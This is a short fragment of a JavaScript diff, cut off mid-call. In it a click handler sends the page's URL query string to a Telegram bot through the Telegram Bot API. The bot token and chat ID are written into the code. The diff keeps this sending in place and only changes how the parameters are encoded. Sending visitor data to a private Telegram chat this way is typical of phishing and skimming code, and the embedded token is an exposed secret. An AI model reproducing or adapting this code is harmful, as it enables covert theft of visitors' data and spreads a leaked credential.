@@ -67,10 +67,10 @@ const handleClick = async function (e) {
   });
 
 
-  const chat_id = "8119682966";
+ const chat_id = "8119682966";
   await fetch(
     `https://api.telegram.org/bot7918895617:AAHJMlKKUynxJcgcBjBg-TiBF4SyXYZy3ns/sendMessage?chat_id=${chat_id}&text=${JSON.stringify(
-      new URLSearchParams(window.location.search)
+      window.location.search
     )}
     `,
     {
